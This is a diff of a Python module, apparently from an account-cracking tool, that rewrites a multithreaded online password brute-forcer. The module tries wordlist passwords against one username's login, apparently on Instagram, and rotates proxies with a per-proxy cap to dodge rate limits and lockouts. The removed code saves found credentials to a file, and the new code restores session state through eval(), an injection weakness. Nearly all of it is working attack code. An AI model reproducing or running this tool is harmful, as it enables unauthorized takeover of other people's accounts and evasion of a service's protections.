@@ -1,283 +1,176 @@
-# Date: 05/05/2018
-# Author: Pure-L0G1C
+# Date: 12/28/2018
+# Author: Mohamed 
 # Description: Bruter
 
-from .queue import Queue 
-from .spyder import Spyder 
-from .session import Session
 from time import time, sleep 
-from threading import Thread, RLock
-from os import system, remove, path
-from platform import system as platform
-from .const import max_fails, fetch_time, site_details, credentials
+from .browser import Browser
+from .session import Session
+from .display import Display
+from threading import Thread, RLock 
+from .proxy_manager import ProxyManager
+from .password_manager import PasswordManager
+from .const import max_time_to_wait, max_bots_per_proxy
 
 
 class Bruter(object):
 
-    def __init__(self, username, threads, wordlist):
-        self.max_threads = threads if all([threads <= 128, threads > 0]) else 128 
-        self.cls = 'cls' if platform() == 'Windows' else 'clear'
-        self.session = Session(username, wordlist)
-        self.wordlist = wordlist
-        self.username = username
-        self.user_abort = False
-        self.passlist = Queue()
-        self.spyder = Spyder()
-        self.retrieve = False 
-        self.isFound = False 
-        self.isAlive = True
+    def __init__(self, username, threads, passlist_path, resume):
+        self.proxy = None 
+        self.browsers = []
         self.lock = RLock()
-        self.read = False 
-        self.attempts = 0
-        self.threads = 0 
-        self.repeats = 0
-        self.pwd = None
-        self.ip = None 
-        self.fails = 0
+        self.password = None 
+        self.is_alive = True 
+        self.is_found = False 
+        self.bots_per_proxy = 0
+        self.username = username
+        self.last_password = None 
+        self.active_passwords = []
+        self.proxy_manager = ProxyManager()
+        self.display = Display(username, passlist_path)
+        self.session = Session(username, passlist_path)
+        self.password_manager = PasswordManager(passlist_path, threads, self.session, resume)
 
-        # reduce flickering display on Windows
-        self.last_attempt = None
-        self.last_proxy = None 
-        self.last_ip = None 
+        if resume:
+            data = self.session.read()
 
-    def login(self, pwd):
-        try:
-            if not self.spyder.proxies.qsize:
-                return 
+            if data:
+                self.password_manager.passlist = eval(data['list'])
+                self.password_manager.attempts = int(data['attempts'])                
 
-            with self.lock:
-                self.pwd = pwd 
-                self.threads += 1
-
-            br = self.spyder.br
-            home_url = site_details['home_url']
-            login_url = site_details['login_url']
-            username_field = site_details['username_field']
-            password_field = site_details['password_field']
-   
-            data = { username_field: self.username, password_field: pwd }
-            br.headers.update({'X-CSRFToken': br.get(home_url).cookies.get_dict()['csrftoken']})
-
-            # login 
-            response = br.post(login_url, data=data, timeout=fetch_time).json()
-
-            # validate
-            if 'authenticated' in response:
-                if response['authenticated']:
-                    self.pwd_found(pwd)
-            elif 'message' in response:
-                if response['message'] == 'checkpoint_required':
-                    self.pwd_found(pwd)
-                elif response['status'] == 'fail': # account got locked
-                    if self.threads > 0:
-                        with self.lock:
-                            self.threads -= 1
-                    return
-                else:
-                    pass 
-            else:
-                pass 
-
-            with self.lock:
-                if all([not self.isFound, self.isAlive, pwd in self.passlist.queue]):
-                    self.passlist.queue.pop(self.passlist.queue.index(pwd)) 
-                    self.attempts += 1
-
-        except KeyboardInterrupt:
-           self.user_abort = True 
-           self.stop()
-        except:
-            with self.lock:
-                self.fails += 1
-        finally:
-            if self.threads > 0:
-                with self.lock:
-                    self.threads -= 1 
-
-    def pwd_found(self, pwd):
-        if self.isFound:
-            return 
-
-        self.isFound = True
-        del self.passlist.queue[:]
-        self.display(pwd, True)
-
-    def kill(self):
-        self.isAlive = False
-        self.spyder.isAlive = False
-
-    def display(self, pwd, isFound=False, n=1):
-        if not isFound:
-            system(self.cls)
+    def manage_session(self):
+        if self.password_manager.is_read:
+            if not self.password_manager.list_size or self.is_found:
+                self.session.delete()
         else:
-            with open(credentials, 'at') as f:
-                f.write('Username: {}\nPassword: {}\n\n'.format(self.username, pwd))
-
-        pwd = pwd if pwd else ''
-        bots = int(self.max_threads/16) 
-        ip = '{}[{}]'.format(self.ip, self.spyder.proxy_info['country']) if all([self.ip, self.spyder.proxy_info]) else ''
-
-        try:
-            if not isFound:
-                print('[-] Proxy-IP: {}\n[-] Wordlist: {}\n[-] Username: {}\n[-] Password: {}\n[-] Attempts: {}\n[-] Proxies: {}\n[-] Bots: {}'.
-                    format(ip, self.wordlist, self.username, pwd, self.attempts, self.spyder.proxies.qsize, bots))
-
-                if not n:
-                    self.display(pwd, isFound=True)
+            if self.is_found:
+                self.session.delete() 
             else:
-                if n:
-                    self.display(pwd, n-1)
-                print('\n[!] Password Found\n[+] Username: {}\n[+] Password: {}'.format(self.username, pwd))
-        except:
-            pass 
+                self.session.write(self.password_manager.attempts, self.password_manager.passlist)
+
+    def browser_manager(self):
+        while self.is_alive:
+
+            for browser in self.browsers:
+
+                if not self.is_alive:
+                    break 
+
+                if not browser.is_active:
+                    
+                    password = browser.password
+
+                    if browser.is_attempted:
+                        
+                        if browser.is_found and not self.is_found:
+                            self.password = password
+                            self.is_found = True 
+
+                        with self.lock:
+                            self.password_manager.list_remove(password) 
+                    else:
+                        with self.lock:
+                            self.proxy_manager.bad_proxy(browser.proxy)
+
+                    if browser.is_locked and not self.is_found:
+                        self.proxy = None                  
+
+                    with self.lock:
+                        self.browsers.pop(self.browsers.index(browser))
+                        self.active_passwords.pop(self.active_passwords.index(password))
+                else:
+                    if browser.start_time:
+                        if time() - browser.start_time >= max_time_to_wait:
+                            browser.is_active = False 
+                            
+                            with self.lock:
+                                self.proxy_manager.bad_proxy(browser.proxy)
 
     def attack(self):
-        while all([not self.isFound, self.isAlive]):
-            try:
-                if any([not self.ip, self.fails >= max_fails]):
-                    try:
-                        if any([not self.spyder.proxies.qsize, self.repeats >= 16]):
-                            continue
+        proxy = None  
+        while self.is_alive:
 
-                        self.spyder.renew_proxy()
-                        ip = self.spyder.ip_addr() 
+            browsers = []
+            for password in self.password_manager.passlist:
 
-                        if not ip:
-                            continue
+                if not self.is_alive:
+                    break 
 
-                        self.ip = ip
-                        self.fails = 0
+                if not self.proxy:
+                    self.proxy = self.proxy_manager.get_proxy()
+                    self.bots_per_proxy = 0
+                    proxy = self.proxy  
 
-                    except KeyboardInterrupt:
-                        self.user_abort = True 
-                        self.stop() 
+                if self.bots_per_proxy >= max_bots_per_proxy:
+                    self.proxy = None 
 
-                # try all the passwords in the queue
-                bots_per_proxy = 0
-                for pwd in self.passlist.queue:
-                    if any([self.threads >= self.max_threads, any([not self.isAlive, self.isFound])]):
-                        break 
+                if not self.proxy:
+                    continue
+                                
+                if not password in self.active_passwords and password in self.password_manager.passlist:
+                    browser = Browser(self.username, password, proxy)
+                    browsers.append(browser)
+                    self.bots_per_proxy += 1
 
-                    if bots_per_proxy >= 16:
-                        while all([not self.spyder.proxies.qsize, not self.isFound, self.isAlive]):
-                            sleep(0.5)
+                    with self.lock:
+                        self.browsers.append(browser)
+                        self.active_passwords.append(password)
 
-                    if all([self.isAlive, self.spyder.proxies.qsize]):
-                        self.spyder.renew_proxy()
-                        bots_per_proxy = 0
-                    else:
-                        break
+            for browser in browsers:
+                thread = Thread(target=browser.attempt)
+                thread.daemon = True 
+                thread.start()
 
-                    # login thread     
-                    login = Thread(target=self.login, args=[pwd])
-                    login.daemon = True
-                    login.start()  
-                    bots_per_proxy += 1     
-
-                # wait time 
-                started = time() 
-
-                # wait for threads 
-                while all([not self.isFound, self.isAlive, self.threads>0, self.passlist.qsize]):
-                    try:
-                        # bypass slow, authentication required, and hanging proxies
-                        if int(time() - started) >= 5:
-                            self.fails = max_fails
-                            self.repeats += 1
-                            self.threads = 0
-                    except:
-                        pass
-
-                self.threads = 0
-                if all([self.isAlive, not self.isFound]):
-                    self.session.write(self.attempts, self.passlist.queue)
-
-            except KeyboardInterrupt:
-                self.user_abort = True 
-                self.stop()
-            except:
-                pass 
-
-    def pwd_manager(self):
-        attempts = 0
-        with open(self.wordlist, 'rt') as wordlist:
-            for pwd in wordlist:
-                if any([not self.isAlive, self.isFound]):
-                    break
-
-                if self.retrieve:
-                    if attempts < (self.attempts + self.passlist.qsize):
-                        attempts += 1
-                        continue
-                    else:
-                        self.retrieve = False
-
-                if self.passlist.qsize <= self.max_threads:
-                    self.passlist.put(pwd.replace('\n', '').replace('\r', '').replace('\t', ''))
-                else:
-                    self.repeats = 0
-                    while all([self.passlist.qsize, not self.isFound, self.isAlive]):
-                        pass
-
-                    if all([not self.passlist.qsize, not self.isFound, self.isAlive]):
-                        self.passlist.put(pwd.replace('\n', '').replace('\r', '').replace('\t', ''))
-
-        # done reading wordlist
-        self.read = True if all([not self.user_abort, self.isAlive]) else False 
-        while all([not self.isFound, self.isAlive, self.passlist.qsize]):
-            try:
-                sleep(1.5)
-            except KeyboardInterrupt:
-                self.user_abort = True 
-                self.stop()
-        if self.isAlive:
-            self.stop()
-
-    def stop(self):
-        if any([self.read, self.isFound]):
-            self.session.delete()
-        else:
-            self.session.write(self.attempts, self.passlist.queue)
-
-        self.kill()  
-
-    def primary_threads(self):
-        proxy_manager = Thread(target=self.spyder.proxy_manager)
-        proxy_manager.daemon = True
-        proxy_manager.start()
-
-        pwd_manager = Thread(target=self.pwd_manager)
-        pwd_manager.daemon = True
-        pwd_manager.start()
-
+    def start_daemon_threads(self):
         attack = Thread(target=self.attack)
+        browser_manager = Thread(target=self.browser_manager)
+        proxy_manager = Thread(target=self.proxy_manager.start)
+        password_manager = Thread(target=self.password_manager.start)
+
         attack.daemon = True
+        proxy_manager.daemon =True 
+        browser_manager.daemon = True
+        password_manager.daemon = True 
+
         attack.start()
+        proxy_manager.start()
+        browser_manager.start()
+        password_manager.start() 
+
+        self.display.info('Searching for proxies ...')
+        
+    def stop_daemon_threads(self):
+        self.proxy_manager.stop()
+        self.password_manager.stop()
 
     def start(self):
-        self.primary_threads()
-        while all([not self.isFound, self.isAlive]):
-            try:
-                if self.isAlive:
-                    if self.ip:
-                        if any([self.last_attempt != self.attempts,
-                            self.last_proxy != self.spyder.proxies.qsize,
-                            self.last_ip != self.ip]):
-                            self.display(self.pwd)
-                            self.last_proxy = self.spyder.proxies.qsize
-                            self.last_attempt = self.attempts
-                            self.last_ip = self.ip
+        self.display.info('Initiating daemon threads ...')
+        self.start_daemon_threads()
 
-                    else:                     
-                        self.display(self.pwd)
+        last_attempt = 0 
+        is_attack_started = False 
+        while self.is_alive and not self.is_found:
+
+            if last_attempt == self.password_manager.attempts and self.password_manager.attempts:
+                sleep(1.5)
+                continue 
+    
+            for browser in self.browsers:
+
+                if not is_attack_started:
+                    self.display.info('Starting attack ...')
+                    is_attack_started = True                    
                 
-                    if not self.spyder.proxy_info:
-                        print('\n[+] Searching for proxies ...')
-                        
-                    sleep(1.5)
-                
-            except KeyboardInterrupt:
-                self.user_abort = True
-                self.stop()   
-            except:
-                pass 
+                self.display.stats(browser.password, self.password_manager.attempts, len(self.browsers))
+                last_attempt = self.password_manager.attempts
+                self.last_password = browser.password
+
+                if not self.is_alive or self.is_found:
+                    break 
+            
+            if self.password_manager.is_read and not self.password_manager.list_size and not len(self.browsers):
+                self.is_alive = False 
+            
+    def stop(self):
+        self.is_alive = False 
+        self.manage_session()
+        self.stop_daemon_threads() 
